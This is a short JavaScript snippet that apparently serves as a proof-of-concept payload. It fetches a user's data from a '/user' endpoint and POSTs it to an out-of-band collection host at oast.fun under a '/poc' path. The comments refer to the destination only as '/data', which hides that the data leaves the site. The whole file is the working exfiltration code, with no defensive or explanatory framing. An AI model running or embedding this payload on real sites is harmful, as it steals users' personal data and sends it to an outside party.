const userEndpoint = 'http://example.com/user';
const dataEndpoint = 'http://qllhsgebdomzecfjwwtrz9iwzjstvbaiu.oast.fun/poc';

// Fetch data from /user
fetch(userEndpoint)
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to fetch user data. Status: ${response.status}`);
    }
    return response.text();
  })
  .then(userData => {
    // Send user data to /data
    return fetch(dataEndpoint, {
      method: 'POST', // You can use 'GET' or 'POST' based on your server requirements
      headers: {
        'Content-Type': 'application/json', // Adjust the content type based on your data format
      },
      body: JSON.stringify({ userData }),
    });
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to send data to /data. Status: ${response.status}`);
    }
    console.log('Data successfully sent to /data');
  })
  .catch(error => {
    console.error('Error:', error);
  });
